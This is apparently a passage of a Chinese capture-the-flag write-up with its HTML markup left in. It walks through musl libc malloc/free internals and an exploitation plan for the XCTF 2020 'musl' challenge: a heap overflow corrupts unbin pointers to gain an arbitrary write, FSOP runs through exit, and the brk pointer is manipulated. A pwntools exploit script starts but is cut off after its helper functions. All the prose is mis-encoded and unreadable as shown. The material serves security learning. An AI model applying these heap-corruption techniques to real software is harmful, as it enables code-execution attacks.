class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¡ä»¶ï¼šself çš„å¤§å° n1 å¤šäº n DONTCARE (0x10) å­—èŠ‚</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† self çš„å¤§å°åˆ‡å‰²ä¸º nï¼Œå‰©ä½™éƒ¨åˆ†æˆä¸ºæ–°çš„ chunk split</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† split é‡Šæ”¾åˆ° bin</span></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc çš„æœ€åä¸€æ­¥æ˜¯trimï¼Œä¸»è¦ä½œç”¨æ˜¯å›æ”¶ chunk è¶…è¿‡éœ€æ±‚å¤§å°çš„éƒ¨åˆ†ã€‚trimå°† chunk å¤šä½™çš„éƒ¨åˆ†åˆ‡å‰²å‡ºæ¥ï¼Œç„¶åå°†å…¶é‡Šæ”¾åˆ° bin ä¸­ï¼Œå‡å°‘å†…å­˜æµªè´¹ã€‚</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥ csize æ²¡æœ‰è®¾ç½® INUSE æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦ä¸º mmap chunk æˆ–è€… double free</span></span><br><span class="line">    <span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">    <span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">// è‹¥ prev size è®¾ç½®äº† INUSE æ ‡å¿—ä½ï¼Œè§†ä¸º double freeï¼Œcrash</span></span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free å…ˆå¯¹ chunk è¿›è¡Œ mmap &#x2F; double free æ£€æŸ¥ã€‚å¦‚æœ chunk çš„csizeå­—æ®µæ²¡æœ‰è®¾ç½®INUSEæ ‡å¿—ä½ï¼Œè¿›å…¥unmap_chunkå‡½æ•°æ£€æŸ¥psizeå­—æ®µã€‚å¦‚æœpsizeå­—æ®µè®¾ç½®äº†INUSEæ ‡å¿—ä½ï¼Œè§†ä¸º double freeï¼Œcrashï¼›å¦åˆ™è§†ä¸º mmap chunkï¼Œè°ƒç”¨__munmapå‡½æ•°é‡Šæ”¾ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">    <span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">    <span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size æ˜¯ self åŸæ¥çš„å¤§å°ï¼Œfinal_size æ˜¯ self åˆå¹¶ç©ºé—² chunk åçš„å¤§å°</span></span><br><span class="line">    final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥ä¸‹ä¸€ä¸ª chunk çš„ psize ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ crash</span></span><br><span class="line">    <span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">    <span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. æ£€æŸ¥ self å‰åæ˜¯å¦æœ‰ç©ºé—² chunk</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// å»é™¤ INUSE æ ‡å¿—ä½</span></span><br><span class="line">            self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">            next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// è®¡ç®— final_size å¯¹åº”çš„ bin ä¸‹æ ‡ i</span></span><br><span class="line">            i = bin_index(final_size);</span><br><span class="line">            lock_bin(i);</span><br><span class="line">            lock(mal.free_lock);</span><br><span class="line">            <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">// é€€å‡ºå¾ªç¯</span></span><br><span class="line">            unlock(mal.free_lock);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘å‰åˆå¹¶ç©ºé—² chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_rev(self)) &#123;  <span class="comment">// ä» bin é“¾è¡¨å–å‡ºå¾…åˆå¹¶çš„ç©ºé—² chunk</span></span><br><span class="line">            self = PREV_CHUNK(self);</span><br><span class="line">            size = CHUNK_SIZE(self);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘ååˆå¹¶ç©ºé—² chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_fwd(next)) &#123;  <span class="comment">// ä» bin é“¾è¡¨å–å‡ºå¾…åˆå¹¶çš„ç©ºé—² chunk</span></span><br><span class="line">            size = CHUNK_SIZE(next);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">            next = NEXT_CHUNK(next);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. åœ¨ binmap ä¸­ï¼Œå°† bin i è®¾ä¸ºéç©º bin</span></span><br><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°† self åŠ å…¥åˆ° bin i é“¾è¡¨çš„å°¾éƒ¨</span></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__bin_chunkå‡½æ•°çš„ä½œç”¨æ˜¯å°† chunk æ’å…¥åˆ° bin é“¾è¡¨ä¸­ã€‚é¦–å…ˆåˆå¹¶ chunk å‰åçš„ç©ºé—² chunkã€è®¾ç½® binmap å’Œ chunk æ ‡å¿—ä½ï¼Œæœ€åå°† chunk æ’å…¥åˆ°å¯¹åº”çš„ bin é“¾è¡¨ä¸­ã€‚</p>
<p>ç„¶ååœ¨muslå½“ä¸­çš„å †ç®¡ç†ä¸ºäº†å‡å°‘å†…å­˜çš„ä½¿ç”¨ä¼šç›´æ¥å°†libcå’Œç¨‹åºå½“ä¸­çš„ç©ºé—²çš„å†…å­˜å½“ä½œå †å†…å­˜ï¼Œè€Œglibcçš„å †åœ°å€ä¸€èˆ¬éƒ½æ˜¯ä½äºå†…å­˜ä¸­çš„åŠ¨æ€å†…å­˜åŒºåŸŸã€‚</p>
<h2 id="XCTF-2020-PWN-musl"><a href="#XCTF-2020-PWN-musl" class="headerlink" title="XCTF_2020_PWN_musl"></a>XCTF_2020_PWN_musl</h2><p><img   src="/images/image-20220427153926579.png"  alt="image-20220427153926579"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç¡®å®æ˜¯ç›´æ¥åœ¨libcå’Œprocessä¸Šé¢æœ‰å †çš„åœ°å€ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯å¾ˆç»å…¸çš„èœå•é¢˜ï¼Œå¹¶ä¸”åœ¨createå‡½æ•°é‡Œé¢æœ‰ä¸€å¤„åªèƒ½è¿è¡Œä¸€æ¬¡çš„0x50çš„æº¢å‡ºï¼Œè€Œä¸”é¢˜ç›®åªæœ‰ä¸€å¤„ä½¿ç”¨exité€€å‡ºç¨‹åºï¼Œç„¶åshowå‡½æ•°ä¹Ÿåªæœ‰ä¸€æ¬¡ã€‚</p>
<h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>å…¶å®åˆ©ç”¨æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œå­˜åœ¨æº¢å‡ºï¼Œunbinåˆæœ‰å¦‚æ­¤å¤§çš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥å°±æ˜¯é€šè¿‡æº¢å‡ºä¿®æ”¹æ‰nextæŒ‡é’ˆå’ŒprevæŒ‡é’ˆä»è€Œå®ç°ä»»æ„åœ°å€å†™ï¼Œé€ æˆFSOP</p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹æ€ä¹ˆé€ æˆçš„FSOP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€åæ˜¯æœ‰æœºä¼šè°ƒç”¨åˆ°fileçš„å†…éƒ¨å‡½æ•°æŒ‡é’ˆçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *rpos, *rend;</span><br><span class="line">	<span class="keyword">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wend, *wpos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *mustbezero_1;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *wbase;</span><br><span class="line">	<span class="keyword">size_t</span> (*read)(FILE *, <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">size_t</span> (*write)(FILE *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">off_t</span> (*seek)(FILE *, <span class="keyword">off_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">int</span> pipe_pid;</span><br><span class="line">	<span class="keyword">long</span> lockcount;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock;</span><br><span class="line">	<span class="keyword">int</span> lbf;</span><br><span class="line">	<span class="keyword">void</span> *cookie;</span><br><span class="line">	<span class="keyword">off_t</span> off;</span><br><span class="line">	<span class="keyword">char</span> *getln_buf;</span><br><span class="line">	<span class="keyword">void</span> *mustbezero_2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *shend;</span><br><span class="line">	<span class="keyword">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨exitæ¥æ‰§è¡ŒFSOPï¼Œä¸è¿‡éš¾ç‚¹å°±æ˜¯æ€ä¹ˆè¿è¡Œåˆ°exitï¼Œå› ä¸ºéœ€è¦mallocè¿”å›ä¸€ä¸ª0xdeadbeefï¼Œåœ¨ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ‰€æœ‰çš„binéƒ½ä¸ºç©ºï¼Œæ­¤æ—¶mallocå°±ä¼šè°ƒç”¨expand_heapæ¥æ‰©å±•å †ï¼Œæœ¬è´¨è¿˜æ˜¯è°ƒç”¨äº†__expand_heapå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__expand_heap(<span class="keyword">size_t</span> *pn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">unsigned</span> mmap_step;</span><br><span class="line">	<span class="keyword">size_t</span> n = *pn;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt; SIZE_MAX/<span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	n += -n &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">		brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">		brk += -brk &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)</span><br><span class="line">	    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;</span><br><span class="line">		*pn = n;</span><br><span class="line">		brk += n;</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">void</span> *)(brk-n);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> min = (<span class="keyword">size_t</span>)PAGE_SIZE &lt;&lt; mmap_step/<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line">	<span class="keyword">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ|PROT_WRITE,</span><br><span class="line">		MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	*pn = n;</span><br><span class="line">	mmap_step++;</span><br><span class="line">	<span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨__expand_heapå‡½æ•°ä¸­ï¼Œbrkæ˜¯æŒ‡å‘æ•°æ®æ®µæœ«å°¾ä½ç½®çš„æŒ‡é’ˆã€‚__expand_heapå‡½æ•°è°ƒç”¨ brk ç³»ç»Ÿè°ƒç”¨__syscall(SYS_brk, brk+n)ï¼Œå°†æ•°æ®æ®µæœ«å°¾å‘åå»¶å±•nå­—èŠ‚ï¼Œç„¶åå»¶å±•éƒ¨åˆ†è¿”å›ç»™mallocä½œä¸ºæ–°çš„ chunk åˆ†é…ç»™ç”¨æˆ·</p>
<p>è‹¥ç¨‹åºä¸å¼€å¯ PIEï¼Œæ•°æ®æ®µçš„åœ°å€é•¿åº¦ä¸º 24 bitï¼ˆ0~0x2000000ï¼‰ï¼Œå†…å­˜ä½ç½®ä¸0xBADBEEFæ¯”è¾ƒæ¥è¿‘ã€‚è‹¥å°†brkæŒ‡é’ˆä¿®æ”¹ä¸º0xBADBEEF - nï¼Œbrk ç³»ç»Ÿè°ƒç”¨å°±ä¼šæŠŠæ•°æ®æ®µå»¶å±•è‡³0xBADBEEFï¼Œä½¿å…¶æˆä¸ºå¯è®¿é—®çš„å†…å­˜åœ°å€ã€‚</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./carbon&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so&#x27;)</span></span><br><span class="line"><span class="comment"># r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)</span></span><br><span class="line">r = process([<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>, <span class="string">&#x27;./carbon&#x27;</span>])</span><br><span class="line">libc = ELF(<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">option</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(option), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, believer, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Are you a believer? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(believer)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Say hello to your new sleeve &gt;&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, 